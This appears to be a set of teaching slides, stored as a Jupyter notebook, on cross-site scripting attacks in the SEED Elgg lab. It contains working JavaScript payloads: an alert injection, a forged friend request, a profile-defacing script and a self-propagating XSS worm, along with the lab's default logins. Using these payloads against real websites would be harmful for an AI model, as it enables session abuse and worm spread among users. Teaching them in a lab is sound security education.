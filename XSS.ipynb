{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "## <center> Cross-Site Scripting Attack </center>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Code injection attack\n",
    "\n",
    "- Second most prevalent issue in the Top Ten web security risks by the Open Web Application Security Project (https://www.owasp.org/index.php/Category:OWASP_Top_Ten_2017_Project)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "<center> <img src=\"figure/xss/xss1.png\" width=\"600\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- Codes coming from the website are considered trusted and will be executed within the protected sandbox of the browser. \n",
    "- If the victim has an active session with the website, the code can do whatever the user can do inside the session. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Two types of XSS attack\n",
    "- Persistent XSS\n",
    "- Non-persistent XSS"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Non-persistent (reflected) XSS attack\n",
    "\n",
    "<center> <img src=\"figure/xss/xss2.png\" width=\"600\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Examples\n",
    "- Go to Google and search for \"cross-site scriping attack\"\n",
    "- How the search query is reflected back inside the web page?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "When a reflect website does not sanitize user inputs, it may have an XSS vulnerability:\n",
    "\n",
    "- Javascript codes can be put into the input so that the codes can be reflected back in the page displayed in the browser of the victim. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Persistent XSS Attack\n",
    "<center> <img src=\"figure/xss/xss3.png\" width=\"600\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Potential damage from XSS\n",
    "- Web defacing via DOM API modification\n",
    "- Spoofing requests\n",
    "- Stealing information"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### XSS Attacks in Action\n",
    "\n",
    "- Use SEED Virtual Machine\n",
    "- www.XSSLabElgg.com\n",
    "- /var/www/XSS/elgg"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "- admin/seedelgg\n",
    "- alice/seedalice\n",
    "- boby/seedboby\n",
    "- charlie/seedcharlie\n",
    "- samy/seedsamy"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Injecting Javascript Code\n",
    "\n",
    "- Place the following code inside the **Brief Description** field of Samy's profile:\n",
    "\n",
    "```\n",
    "<script> alert(\"XSS\"); </script>\n",
    "```\n",
    "\n",
    "- What happens when someone else visits Samy's profile?"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Use XSS Attacks to Befriend with Others\n",
    "\n",
    "- Examine Page Source to identify add-friend request string and security token parameters\n",
    "- In Javascript code, we will use Ajax to send out HTTP requests in background"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "Enter the followings into Samy's **About me** field (must switch to Edit HTML mode):\n",
    "\n",
    "```\n",
    "<script type=\"text/javascript\">\n",
    "window.onload = function(){\n",
    "// Set the timestamp and secret token parameters \n",
    "var Ajax = null;\n",
    "var ts    = \"&__elgg_ts=\"+elgg.security.token.__elgg_ts;      \n",
    "var token = \"&__elgg_token=\"+elgg.security.token.__elgg_token; \n",
    "\n",
    "// Construct the URL (Samy's GUID is 47)\n",
    "var sendurl=\"http://www.xsslabelgg.com/action/friends/add\"     \n",
    "             + \"?friend=47\" + token + ts;                      \n",
    "\n",
    "// Create and send the Ajax request\n",
    "Ajax=new XMLHttpRequest();\n",
    "Ajax.open(\"GET\",sendurl,true);\n",
    "Ajax.setRequestHeader(\"Host\",\"www.xsslabelgg.com\");\n",
    "Ajax.setRequestHeader(\"Content-Type\",\n",
    "                      \"application/x-www-form-urlencoded\");\n",
    "Ajax.send();\n",
    "}\n",
    "</script>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Use XSS Attacks to modify profiles\n",
    "\n",
    "```\n",
    "<script type=\"text/javascript\">\n",
    "window.onload = function(){\n",
    "// Access user name and guid\n",
    "var name = \"&name=\" + elgg.session.user.name;\n",
    "var guid = \"&guid=\" + elgg.session.user.guid;\n",
    "\n",
    "// Access timestamp and security token\n",
    "var ts    = \"&__elgg_ts=\"+elgg.security.token.__elgg_ts;\n",
    "var token = \"&__elgg_token=\"+elgg.security.token.__elgg_token;\n",
    "\n",
    "// Set the content and access leve for the description field\n",
    "var desc = \"&description=SAMY+is+MY+HERO\";\n",
    "desc += \"&accesslevel%5Bdescription%5d=2\";\n",
    "\n",
    "// Set the URL\n",
    "var sendurl=\"http://www.xsslabelgg.com/action/profile/edit\";\n",
    "\n",
    "// Construct and send the Ajax request\n",
    "if(elgg.session.user.guid != 47)     \n",
    "{\n",
    "   //Create and send Ajax request to modify profile\n",
    "   var Ajax=new XMLHttpRequest();\n",
    "   Ajax.open(\"POST\", sendurl, true);\n",
    "   Ajax.setRequestHeader(\"Host\",\"www.xsslabelgg.com\");\n",
    "   Ajax.setRequestHeader(\"Content-Type\",\n",
    "                         \"application/x-www-form-urlencoded\");\n",
    "\n",
    "   // Send the POST request with the data\n",
    "   Ajax.send(token + ts + name + desc + guid);\n",
    "}\n",
    "}\n",
    "</script>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### Achieving self-propagation\n",
    "\n",
    "<center> <img src=\"figure/xss/xss4.png\" width=\"600\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "#### DOM Approach\n",
    "\n",
    "- Add an identifier to the Javascript so that it is stored and accessible via the page's DOM (Document Object Model). \n",
    "- Include with the script a self-calling function that adds script's content from DOM to the victim's profile. "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "```\n",
    "<script id=\"worm\" type=\"text/javascript\">\n",
    "window.onload = function(){\n",
    "var headerTag = \"<script id=\\\"worm\\\" type=\\\"text/javascript\\\">\";  \n",
    "var jsCode = document.getElementById(\"worm\").innerHTML;\n",
    "var tailTag = \"</\" + \"script>\";                                  \n",
    "\n",
    "// Put all the pieces together, and apply the URI encoding \n",
    "var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);  \n",
    "// Access user name and guid\n",
    "var name = \"&name=\" + elgg.session.user.name;\n",
    "var guid = \"&guid=\" + elgg.session.user.guid;\n",
    "\n",
    "// Access timestamp and security token\n",
    "var ts    = \"&__elgg_ts=\"+elgg.security.token.__elgg_ts;\n",
    "var token = \"&__elgg_token=\"+elgg.security.token.__elgg_token;\n",
    "\n",
    "// Set the content and access leve for the description field\n",
    "var desc = \"&description=SAMY+is+MY+HERO\" + wormCode;\n",
    "desc += \"&accesslevel%5Bdescription%5d=2\";\n",
    "\n",
    "// Set the URL\n",
    "var sendurl=\"http://www.xsslabelgg.com/action/profile/edit\";\n",
    "\n",
    "// Construct and send the Ajax request\n",
    "if(elgg.session.user.guid != 47)     \n",
    "{\n",
    "   //Create and send Ajax request to modify profile\n",
    "   var Ajax=new XMLHttpRequest();\n",
    "   Ajax.open(\"POST\", sendurl, true);\n",
    "   Ajax.setRequestHeader(\"Host\",\"www.xsslabelgg.com\");\n",
    "   Ajax.setRequestHeader(\"Content-Type\",\n",
    "                         \"application/x-www-form-urlencoded\");\n",
    "\n",
    "   // Send the POST request with the data\n",
    "   Ajax.send(token + ts + name + desc + guid);\n",
    "}\n",
    "}\n",
    "</script>\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "slideshow": {
     "slide_type": "slide"
    }
   },
   "source": [
    "### Countermeasures:\n",
    "\n",
    "- Filter all Javascript codes (difficult to implement)\n",
    "- Replace HTML markups with alternate representation, encoding and decoding syntax (<, >, ...)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "celltoolbar": "Slideshow",
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
